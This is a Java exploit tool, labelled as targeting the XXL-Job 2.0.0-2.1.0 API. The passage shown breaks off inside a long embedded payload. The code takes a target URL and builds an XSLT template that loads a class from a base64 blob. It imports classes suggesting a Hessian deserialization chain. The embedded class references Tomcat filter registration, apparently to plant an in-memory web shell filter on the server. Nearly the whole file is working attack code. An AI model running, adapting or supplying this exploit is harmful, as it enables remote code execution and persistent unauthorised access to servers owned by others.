package clic.sd.skyway.xjae;

import com.caucho.hessian.io.Hessian2Output;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.UIDefaults;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

public class Main {
	public static void main(String[] args) throws IOException {
		System.out.println("********************************************");
		System.out.println("*** XXL-Job 2.0.0-2.1.0 api exploit tool ***");
		System.out.println("********************************************\n");
		String target;
		if (args.length < 1) {
			System.out.println("输入目标地址：");
			System.out.println("eg.: http(s)://ip:port/xxl-job-admin/api");
			Scanner in = new Scanner(System.in);
			target = in.nextLine();
		} else {
			target = args[0];
		}
		System.out.println("Target: " + target);

		OkHttpClient client = new OkHttpClient.Builder()
				.connectTimeout(10, TimeUnit.SECONDS)
				.readTimeout(30, TimeUnit.SECONDS)
				.writeTimeout(30, TimeUnit.SECONDS)
				.build();

		Request request = new Request.Builder()
				.url(target)
				.header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0")
				.header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
				.header("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
				.header("Accept-Encoding", "gzip, deflate")
				.header("Connection", "close")
				.get().build();
		try (Response response = client.newCall(request).execute()) {
			int statusCode = response.code();
			if (statusCode != 200) {
				System.err.println("目标无法访问，Response Code is: " + statusCode + "\n");
				pause();
				return;
			}
			System.out.println("目标可访问，Response Code is: " + statusCode + "\n");

			String xsltTemplate = "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n"
					+ "                xmlns:b64=\"http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\"\n"
					+ "                xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"\n"
					+ "                xmlns:th=\"http://xml.apache.org/xalan/java/java.lang.Thread\"\n"
					+ "                xmlns:ru=\"http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\"\n"
					+ ">\n"
					+ "    <xsl:template match=\"/\">\n"
					+ "        <xsl:variable name=\"bs\" select=\"b64:decodeBuffer(b64:new(),'base64')\"/>\n"
					+ "        <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n"
					+ "        <xsl:variable name=\"rce\" select=\"ru:defineClass('classname',$bs,$cl)\"/>\n"
					+ "        <xsl:value-of select=\"$rce\"/>\n"
					+ "    </xsl:template>\n"
					+ "</xsl:stylesheet>";

			String base64Code = "yv66vgAAADEBsgEAI2NvbS9mYXN0ZXJ4bWwvamFja3Nvbi93bC9UaHJlYWRVdGlsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADWdldFVybFBhdHRlcm4BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAAIvKggACAEADGdldENsYXNzTmFtZQEAJG9yZy5zcHJpbmdmcmFtZXdvcmsuU2Vzc2lvbkZhekZpbHRlcggACwEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMBABNqYXZhL2lvL0lPRXhjZXB0aW9uBwAPAQAQamF2YS9sYW5nL1N0cmluZwcAEQEKTEg0c0lBQUFBQUFBQUFLVlhDWHNUMXhVOXo1STlZMW1FSUlLeGdBUm5BU3pMdGxLRFV5d1RFc3N4d1lsdFVwU2FPazZYc1RTeUJVSWpaa2FBNkpJMGJaUHVUWnR1NmI2VDdxUU5NZzRFNkJZYW1qYmQzSCtUZmoxdlJwSWxXVFo4WDcvUG1wazM3NzV6N3p2MzNQdkcxLy83Nm1VQTc4Qi9CTzR4ekxtSWxUUFQyYm1VcVIzWFR4bm1zVWhjdDZ5MGtUMmduVG1RenRpNnFVQUliRHFxbmRRaUdTMDdGeG5KYUpZMWJtaEpPZVVSdUUxT25ZNVl1bmt5bzl1UjhxSm1BVEhIaFYwenNkQjQzZW9oQWUrSWtkUUYxbytucy9way92aXNiajZ1eldiNEpqQnVKTFRNbEdhbTViajAwbXZQcHkyQm5lTTNFekRSeGF4QTAweE1vQzJwcCtqQjhTcXdtY0dNamEwTXg0OWJzY0VITHdJQ0xmdlMyYlM5WDhEVEZacnk0elpza2hQdEFsdTY2dGU1SkF5RnB1Z3dRZlJWNWlWSWh3VFpLcUFtRFRkSWdSa1hiNW01dUhzL3JKL0k2NVk5dE5xc2xUT3lsbDQvN2FLT3pHdnByQlBReHVWWVJrOG45SnhOaGhSc0YxQXNseTZCempxSWVkdk9SUTd5VWlLVVBIcU0yYU15U1E1WTNrNW5JaE5hanU4M2xaWW16RUxPTmlJajZkeTh5N3RlbnF0enpibGJySnI5Q2R5eDl2N3AxNnJkczhEMkc1RENoS2VXaVJEWXVnWkxwTUlzaDdKcmRTcnFZbExOU2pEMStWdTVxQkxWanB1Q1Y5QlBqZDhjcUlJOUF1dml0cFk0eHBTVXlzUTNyMHZGVGJJeVpDRXQ1eUZ1eTVLaEV0K0p2YTFvd3FCQTY1eHVIM1RNNmJOcnBXMm8wZkloN0d2RGJ0eFBubDFYVTFvbXIvdnhnQXY3b01DdDlhc1VzQXpWaEpHMVNUcHJjR3ROR2MxclpseHVQcHZRaDBKUCtQRVFSbjBZd1FIdWhmSEZ5MUs5cXl0MEk3SDZjUkJqTXJoSEJEWXM2L1dnWnMyVElBWGpQa3lnWFVVZmFhdVJzNExIS1BSY25qTFlXeDNib2RtamVxSlVoalZ2UWl0ZitYRVk4VGE4QzQrcnVGZkZuYXlFdklyM3NISGwyQWY4ZU1MbFo0YWlYM3NiQ3Q1THRoaU1ReXlGMlNBekRTSmlvM28vUHRDRzkwSGpYb1pINHlvU3BSNVFWNlFLaU5wR2JzZXlscTJSZG9IUXF0bXZMM0EvNWpEdlF3cHBsbUtOZ1pYVEU2ekdoS25iaitxRk9FY0tqbkVuZEJRcjJEcno3dTBLemNUOE9JNnNUTERoTnVNR2pwMmVlOEtIRENoTXIrekYwblRNdGJUMFJONU0yNFVJblRpbU52SXlucE0xd25OWlVYRGFEYURVL0RkMk5XcjhaL0JCSHdyNEVMdE4zYVNDajdCcGxkZTd2VndndUJLbDB1YWZ4a2Q5ZUFyUCtKaHE5dnB0YTdVM0JaOXdhL0J3cVFhM2xJSFRSaVNXVDZWMFUwKzZjMFIrRHA5c3c3UDRsRUI3WXhzRm4zRjZrNWFVQnlvUDVhNkc5ZnM1Zk42SHorSUwzRmpTaUdtV2Z0K2VoL1NFY3hLM04xS0J6TmdYOFNXNW9SZllMK1hobGRVeVBDVGxxUzRudjRLdlN2Ni81b2NDVlpxOVNIVmw5VlBMNnFxTnBGSXYzOFMzSkZmZkpoWUowVEtXL0ZSb29HejJoTy9pZXpKRjN5ZjVxM1p6QlQ4VWVQRC9PMUdsbm03SGo5dndJL3lFL2FkeWRsbmwwNVNzangycU9rMS91cUtjUzVCVk5qOFhhRTVrdERObjJKVWFmQVlwU1lkK3M3WmRselpQL1ovVXpBRld0R1hUb3QzS1ovdU9wNjFFWDJ3NFBsck9uS25pdDhSSkdhVzJ2K01HdmJ3cy9QTW95Z1FzQ1BqZEdGeEJxVmgwZFRtaDIvTkdza0pxRGQ3TUNyeHFENmFleWpEOGlJdEFWeGR4U2JwNlRhQmpOU3NGVjZpRWRQYWtjWXg3R0d5Z2hKbWJiTVMvdys5OXVJby9LRmhmYWdwOXN0UDN1V3BYOGJwN3RGVEkrelA5dWdTb3VNNjJWcStoa3NpTWJDbzk1M3haK1ZOVmIxamxhOWs3Q1dieWpBSmowZmNNNkx2N0IxUDY3RUJ5c0g5Z1ZzWGZlUmFkN2sxazBuclc3azFxdHFiaW4wNFp6K29GSTV0VThXL2N5WnJ5Z2pIQ3d5dlBFWDY3QzNtTU8vY0huRHUvMEdYNThkckswZjIwYitLOXRUdnNDVjlld01aekhEVEJ4MnNMVGNEMjJzWnJ1MnNFUDlZQnp0TXRXTTk1SVQ5NVMxQ2p0SkVyTm5jdjhCZjR4M2s4MlIzNDEzbEV1d05MNXpIOGNnWFk1NEJ0Sm1pSEErNTNsNVhBSldSSENmSXhXa3JianU3d0FyYmRHSE1yVWJaVkJkeFJDYmdEUVd4eEFyNGRkM0NPNk9JU3R5aTlMSVd2WW5mVTIzTVZBOUhtb0xmN0ZVUVhzYjhKcitPbHFoRWZob3Q0K0VXOElNMFg4YWhBdE9VaUpxWVhNQmxWZ2tyZ1VIZ1I3L2JnQ0IrbmdzMlY1eVBCbHRKelMyQ2FJRTh1WXRhRFFQSUNqa2JWb05wOEVSbm5kUkc1UUhJQlZoR25McUpwdXJ1SUR4ZnhzUVY4UEtoMkUvblRBa1U4WDhTWGkvaDZFZDhvNGp0QnBZZ2ZIRG1MdHQ1d3p5TE9lbkFXNjZJdDVjSEwzS29mMTNBZG5SU0RwT2dSQkhqZHprMTNjdVp1UkhBUG90akI4M1VuSnJHTGN1bGljKzZHaFRBUHVoNDhqMTVjUWgrdTBQSWFQNVd1ODkvQU45RlBtZTF4S0U0Uk5ZcG5LTHE3aURuQ3BuczNFUld1alpIc0haVFltL3p0SkhLTEpMbVNpaVg2Q1RrcFg2SzNzSk9vSmZyclpad3RlSXNlSXhTbEgyL2dYbnBzeG4yYzN3RHYyN2lpWUxlQ0FTV21vTE1WTHprU2JjTFA4QXVDOGR4eHM0cTMrYmFaOTBMZ2xRdTRNTkVUZU5YN0dwNmE5Z1JHNGtWYzdpRnhIQmVtUFdFTy8zZ1ZmNnI4blpzSVhPT0t5ZDdBR3g2dW9MSGd2VUNycURmb1pUb0NmNmxHQ25wWHczSDJKbU12TTcvRllXQXZyNE44R3lXSFF4enR3empMVHpLNW56TXRaT0tYK0JVM3NSZkR6cE9IODczNE5jNlJqWDQ4ekl6dWNyZ3FWSmdzNERlMEZnNURyTllUNU1XaFJiYUFUdjVzWnNBbFpjQXBGR3ArdVdMYzhvNVZWWXVvQUF2OEZYL2p0UXdtR1g2clV1aGh4NklCMkdoVk9WZkEvZ2NYdTQwblF4QUFBQT09CAATAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAVABYKABIAFwEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABoBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAZmaWx0ZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAdjb250ZXh0AQAIY29udGV4dHMBABBMamF2YS91dGlsL0xpc3Q7AQAEdGhpcwEAJUxjb20vZmFzdGVyeG1sL2phY2tzb24vd2wvVGhyZWFkVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACcBABJqYXZhL3V0aWwvSXRlcmF0b3IHACkBAA1TdGFja01hcFRhYmxlDAAVABkKAAQALAEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMAC4ALwoAAgAwAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAyADMLACgANAEAB2hhc05leHQBAAMoKVoMADYANwsAKgA4AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA6ADsLACoAPAEACWdldEZpbHRlcgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAA+AD8KAAIAQAEACWFkZEZpbHRlcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAQgBDCgACAEQBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAFABABBqYXZhL2xhbmcvVGhyZWFkBwBSAQARamF2YS91dGlsL0hhc2hNYXAHAFQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBWCgBXACwBAApnZXRUaHJlYWRzCABZAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFsAXAoAAgBdAQAHZ2V0TmFtZQwAXwAGCgBTAGABABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABiAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGQAZQoAEgBmAQAGdGFyZ2V0CABoAQAFZ2V0RlYMAGoAXAoAAgBrAQAGdGhpcyQwCABtCABHAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAHAAcQoAVQByAQANamF2YS91dGlsL1NldAcAdAsAdQA0AQADZ2V0DAB3AD8KAFUAeAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAegB7CgAEAHwBAA9qYXZhL2xhbmcvQ2xhc3MHAH4KAH8AYAEAD1N0YW5kYXJkQ29udGV4dAgAgQEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAgwCECwAoAIUBABVUb21jYXRFbWJlZGRlZENvbnRleHQIAIcBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACJAIoKAFMAiwEACHRvU3RyaW5nDACNAAYKAH8AjgEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIAJABAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCACSAQAJcmVzb3VyY2VzCACUCAAgAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAJcBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYMABUAmQoAmACaAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAJwBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwCeAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAoAEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL1Rocm93YWJsZQcApAEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwCuAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DACwALEKAFMAsgEADmdldENsYXNzTG9hZGVyDAC0AIoKAH8AtQwACgAGCgACALcBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC5ALoKAK8AuwwADQAGCgACAL0BAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAC/AMAKAAIAwQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADDAMQKAAIAxQgAqAcApwEAEWphdmEvbGFuZy9JbnRlZ2VyBwDJAQAEVFlQRQwAywCrCQDKAMwBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAM4AzwoAfwDQAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwDSAQANc2V0QWNjZXNzaWJsZQEABChaKVYMANQA1QoA0wDWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMANgA2QoAygDaAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADcAN0KANMA3gEAC25ld0luc3RhbmNlDADgADsKAH8A4QEADWdldEZpbHRlck5hbWUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADGxhc3REb3RJbmRleAEAAUkBAAljbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAAEuCADpAQALbGFzdEluZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAOsA7AoAEgDtAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7DADvAPAKABIA8QEACWZpbHRlckRlZgEACWZpbHRlck1hcAEAAmUyAQAMY29uc3RydWN0b3JzAQAgW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAAxmaWx0ZXJDb25maWcBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOY2F0YWxpbmFMb2FkZXIBAA9maWx0ZXJDbGFzc05hbWUBAApmaWx0ZXJOYW1lAQAjW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjwqPjsHAPcBABFnZXRDYXRhbGluYUxvYWRlcgwBAACKCgACAQEMAOMA5AoAAgEDAQANZmluZEZpbHRlckRlZggBBQEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWwEHCgACAQgBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggBCgEAB2Zvck5hbWUMAQwAugoAfwENAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJNYXAIAQ8BACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJEZWYIAREBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXAIARMBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DAEMARUKAH8BFgEADXNldEZpbHRlck5hbWUIARgBAA5zZXRGaWx0ZXJDbGFzcwgBGgEADGFkZEZpbHRlckRlZggBHAEADXNldERpc3BhdGNoZXIIAR4BAAdSRVFVRVNUCAEgAQANYWRkVVJMUGF0dGVybggBIgwABQAGCgACASQBADBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuQXBwbGljYXRpb25GaWx0ZXJDb25maWcIASYBABdnZXREZWNsYXJlZENvbnN0cnVjdG9ycwEAIigpW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsMASgBKQoAfwEqAQANc2V0VVJMUGF0dGVybggBLAEAEmFkZEZpbHRlck1hcEJlZm9yZQgBLgEADGFkZEZpbHRlck1hcAgBMAEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwEyCgEzANYBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAOABNQoBMwE2CAD5AQANamF2YS91dGlsL01hcAcBOQEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAE7ATwLAToBPQEAD3ByaW50U3RhY2tUcmFjZQwBPwAZCgAbAUABACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBQgEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uBwFEAQABaQEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAFMAQAMZGVjb2RlQnVmZmVyCAFOAQAJZ2V0TWV0aG9kDAFQAM8KAH8BUQEAEGphdmEudXRpbC5CYXNlNjQIAVMBAApnZXREZWNvZGVyCAFVAQAGZGVjb2RlCAFXAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwFiAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBZAEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFmCgFjACwBAAUoW0IpVgwAFQFpCgFlAWoBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABUBbAoBZwFtAQAEcmVhZAEABShbQilJDAFvAXAKAWcBcQEABXdyaXRlAQAHKFtCSUkpVgwBcwF0CgFjAXUBAAt0b0J5dGVBcnJheQEABCgpW0IMAXcBeAoBYwF5AQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBfwGACgACAYEBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBgwoBhADWCgGEAHgBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAYcBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAYoBiwoAfwGMAQANZ2V0U3VwZXJjbGFzcwwBjgB7CgB/AY8KAYgAFwEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEAE1tMamF2YS9sYW5nL09iamVjdDsBAAZtZXRob2QBAAl0ZW1w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